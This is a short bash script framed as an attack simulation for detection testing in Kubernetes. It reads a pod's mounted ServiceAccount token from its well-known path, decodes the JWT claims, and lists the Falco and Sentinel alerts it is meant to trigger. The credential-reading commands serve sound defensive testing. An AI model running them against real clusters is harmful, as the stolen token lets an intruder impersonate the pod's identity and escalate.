#!/bin/bash
# ============================================================================
# Attack Simulation: Service Account Token Theft
# MITRE ATT&CK: T1528 - Steal Application Access Token
# Run from: kubectl exec -it peirates -n attacker -- /bin/sh
# ============================================================================
#
# TACTIC: Credential Access (TA0006). Every pod (unless opted out) has its
# ServiceAccount JWT auto-mounted at a well-known path. That token authenticates to the
# Kubernetes API as the pod's identity. Reading it is step one of most in-cluster
# attacks — it's the credential the attacker then replays to pivot and escalate.
#
# THIS IS AN INTENTIONAL ATTACK SIMULATION for detection testing.
#
# WHAT A DEFENDER SHOULD SEE: a Falco alert for a process reading the SA token path
# inside a container, surfaced in ContainerLogV2; subsequent API use shows in AKSAudit.

# Read the auto-mounted ServiceAccount JWT straight to stdout. This exact path — the
# projected token location every pod gets — is what runtime detections watch for.
echo "[*] Reading mounted service account token..."
cat /var/run/secrets/kubernetes.io/serviceaccount/token

echo ""
echo "[*] Decoding token header..."
# Capture the token, then decode its CLAIMS to see what identity/permissions it carries:
#   cut -d'.' -f2  -> take the middle segment of the JWT (header.PAYLOAD.signature)
#   base64 -d      -> decode that payload from base64
#   python3 ...    -> pretty-print the JSON claims (namespace, SA name, expiry, etc.)
# The `|| echo ...` fallback covers containers without python3 installed.
token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $token | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Install python3 to decode"

echo ""
# Operator-facing summary of the detections this should trip.
echo "[*] Token theft complete. Expected Falco alert: 'Read ServiceAccount Token in Container'"
echo "[*] Expected Sentinel table: ContainerLogV2 (via Falco) + AKSAudit"
